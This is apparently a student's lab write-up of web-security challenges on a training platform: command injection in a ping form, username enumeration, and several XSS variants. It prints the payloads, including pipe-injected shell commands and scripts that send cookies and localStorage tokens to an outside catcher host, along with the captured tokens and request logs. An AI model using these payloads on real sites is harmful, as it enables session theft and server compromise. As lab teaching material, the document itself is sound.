# Web Attack 3: Command Injection

- watched Request and Response of the ping page via Burp Proxy
- tried to see if we can execute other commands by adding or piping our own commands

```sh
address=127.0.0.1 | ls -la
```

```sh
total 912
drwxr-xr-x. 2 www-data www-data    166 Aug 22  2018 .
drwxr-xr-x. 3 root     root         18 Jul 17  2018 ..
-rwxr-xr-x. 1 root     root     140936 Aug 20  2018 bootstrap.min.css
-rwxr-xr-x. 1 root     root     542194 Aug 20  2018 bootstrap.min.css.map
-rwxr-xr-x. 1 root     root      51039 Aug 20  2018 bootstrap.min.js
-rwxr-xr-x. 1 root     root     176087 Aug 20  2018 bootstrap.min.js.map
-rwxr-xr-x. 1 root     root       5430 Aug 20  2018 favicon.ico
-rwxr-xr-x. 1 root     root       1358 Aug 21  2018 index.php
-rwxr-xr-x. 1 root     root        467 Aug 20  2018 signin.css
```

- after that we accessed the `index.php` file

```php
<?php
/* GOLDNUGGET is in env vars */
$response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST['address']."'");
echo $response;
?>
```

- based on the given information we watched the environment variables

```sh
address=127.0.0.1 | printenv
```

- FLAG=FLAG{ThePwr0fTheS3m1}

# Web Security: Username Enumeration

- watched Request and Response of the login page via Burp Proxy
- used the Intruder of Burp Proxy with the given username list as the first payload and the password `DarkSide2021` as the second payload to automatically try out all variants
- valid usernames on the webapp:
  - jabba
  - tarkin
- user: `vader` has the password `DarkSide2021`

# GlockenEmil 2.0 – XSS

- watched Request and Response of the product page when a user rates a product via Burp Proxy
- tried to test if javascript code is being reflected

```javascript
<script>alert("XSS");</script>
```

- based that and on given code from the lecture tried to add this javascript code as a rating to send the token to the catcher

```javascript
<script>
  XSSImage=new
  Image;XSSImage.src='https://a8934706-d080-4c6f-be16-b4c7799ca5c2.idocker.vuln.land/abcd?token='
  + localStorage.getItem('token');
</script>
```

```
URL: http://a8934706-d080-4c6f-be16-b4c7799ca5c2.idocker.vuln.land/abcd?token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTY5NjY5ODc0OSwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.z_IUAAZGinu9iiIEzGAl80YSM5imUt1fQInUJWC85xk%22
METHOD: GET
IP: 10.20.0.1
Time: 2023-10-07 17:50:13
Headers:
Host: a8934706-d080-4c6f-be16-b4c7799ca5c2.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://7f8431c8-77fa-4f2d-8339-e65c99d9a4e6.idocker.vuln.land/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 51.154.62.18
X-Forwarded-Host: a8934706-d080-4c6f-be16-b4c7799ca5c2.idocker.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: vm-docker-01.vuln.land
X-Real-Ip: 51.154.62.18


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTY5NjY5ODc0OSwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.z_IUAAZGinu9iiIEzGAl80YSM5imUt1fQInUJWC85xk%22'
===================================================
```

# XSS – DOM based

- tried out if we can add javascript in the URL as a fragment

```url
https://3e15ae12-6d8f-4421-bfa0-d797b9a7374f.idocker.vuln.land/start.html#<script>console.log('test');</script>
```

- the fragment code is evaluated by jquery because the text in the fragment is directly added after the `<body>` tag and if it is a script it is then executed by the client
- based on that and the code from the challenge before we prepared the URL to send the cookie to the catcher

```url
https://3e15ae12-6d8f-4421-bfa0-d797b9a7374f.idocker.vuln.land/start.html#<script>XSSImage=new Image;XSSImage.src='https://cd4a9a57-b34e-41d7-8651-0b8475230cea.idocker.vuln.land/abcd?cookie=' + document.cookie;</script>
```

```
URL: http://cd4a9a57-b34e-41d7-8651-0b8475230cea.idocker.vuln.land/abcd?cookie=jsessionid=my_name_is_bond_007
METHOD: GET
IP: 10.20.0.1
Time: 2023-10-07 18:36:27
Headers:
Host: cd4a9a57-b34e-41d7-8651-0b8475230cea.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://3e15ae12-6d8f-4421-bfa0-d797b9a7374f.idocker.vuln.land/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 51.154.62.18
X-Forwarded-Host: cd4a9a57-b34e-41d7-8651-0b8475230cea.idocker.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: vm-docker-01.vuln.land
X-Real-Ip: 51.154.62.18


QueryString:
b'cookie=jsessionid=my_name_is_bond_007'
===================================================
```

- the server cannot detect this attack, because the fragment is executed on client side and the server cannot see the request

# GlockenEmil 2.0 – DOM Local Storage

- tried the same things as the challenges before
- we tried many variants and noticed that we need to append our script code directly after `selectedQuantity=1` and encode the code
- based on that we prepared the URL for the victim

```url
https://332c0e0d-137d-49ae-b806-a1dce5677ec8.idocker.vuln.land/#!/shop?selectedQuantity=1<script>XSSImage=new Image;XSSImage.src='https://a1351a17-8997-4f99-9557-4e05eb2b7695.idocker.vuln.land/abcd?token='%2BlocalStorage.getItem('token');</script>
```

```
URL: http://a1351a17-8997-4f99-9557-4e05eb2b7695.idocker.vuln.land/abcd?token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTY5NjcwNDU3NiwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.5BUnuWUt1Unf-q7tMy1UTfMwpTjVMLYgZsViBp6xpTs%22
METHOD: GET
IP: 10.20.0.1
Time: 2023-10-07 19:14:54
Headers:
Host: a1351a17-8997-4f99-9557-4e05eb2b7695.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://332c0e0d-137d-49ae-b806-a1dce5677ec8.idocker.vuln.land/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 51.154.62.18
X-Forwarded-Host: a1351a17-8997-4f99-9557-4e05eb2b7695.idocker.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: vm-docker-01.vuln.land
X-Real-Ip: 51.154.62.18


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTY5NjcwNDU3NiwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.5BUnuWUt1Unf-q7tMy1UTfMwpTjVMLYgZsViBp6xpTs%22'
===================================================
```

# GlockenEmil 2.0 – SVG

- tried the same things as the challenges before but now inside the svg itself
- based on the given information from the lecture we prepared the malicious svg

```svg
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000" viewBox="0 0 32 32">
<rect fill="#f00" height="32" width="32"/>
<rect fill="#fff" height="6" width="20" x="6" y="13"/>
<rect fill="#fff" height="20" width="6" x="13" y="6"/>
<script>
XSSImage=new Image;
XSSImage.src='https://50065b9f-1f0d-4b75-8c95-77244a799976.idocker.vuln.land/abcd?token=' + localStorage.getItem('token');
</script>
</svg>
```

```
URL: http://50065b9f-1f0d-4b75-8c95-77244a799976.idocker.vuln.land/abcd?token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTY5Njc1MjIxMiwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.sh6qGjtpyCZ8K-pBwEdbrd4h_y2pFUcqb4M-_HgLwEo%22
METHOD: GET
IP: 10.20.0.1
Time: 2023-10-08 08:14:43
Headers:
Host: 50065b9f-1f0d-4b75-8c95-77244a799976.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://fddb9b3c-a927-46fd-9053-2a2a08081091.idocker.vuln.land/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 51.154.62.18
X-Forwarded-Host: 50065b9f-1f0d-4b75-8c95-77244a799976.idocker.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: vm-docker-01.vuln.land
X-Real-Ip: 51.154.62.18


QueryString:
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTY5Njc1MjIxMiwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.sh6qGjtpyCZ8K-pBwEdbrd4h_y2pFUcqb4M-_HgLwEo%22'
===================================================
```

# SCHOGGI: Cross-Site Scripting (XSS) (Level 2)

- tried to test if javascript code is being reflected by adding the alert function in the comment section

```javascript
<script>alert("XSS");</script>
```

- as already mentioned in the task sheet, this does not work directly
- we tried to test the second suggested variant which worked

```html
<img src="x" onerror='alert("XSS")' />
```

- based on that we tested many variants
- the variant with `fetch` worked as intended

```html
<img
  src="x"
  onerror="fetch('https://05a51047-0e70-43ee-a085-69ef61560b34.idocker.vuln.land/abcd?cookie=' + document.cookie);"
/>
```

```
GET /abcd?cookie=token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI0MmJjZmQ4Ni04NDExLTQ3MTctYWU2OC05ZTQwNzBmN2ZlZWYiLCJ1aWQiOjEwMiwiZXhwIjoxNjk2NzU3MDYwfQ.pr2mgrRDWTZxN4Z6SK33PMxqirUShgAbpOn9IzIFIaE HTTP/1.1
Host: 05a51047-0e70-43ee-a085-69ef61560b34.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Origin: https://72bd88d5-fe81-4d24-b274-ba5596c25e37.idocker.vuln.land
Referer: https://72bd88d5-fe81-4d24-b274-ba5596c25e37.idocker.vuln.land/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers
X-Forwarded-For: 51.154.62.18
X-Forwarded-Host: 05a51047-0e70-43ee-a085-69ef61560b34.idocker.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: vm-docker-01.vuln.land
X-Real-Ip: 51.154.62.18
```
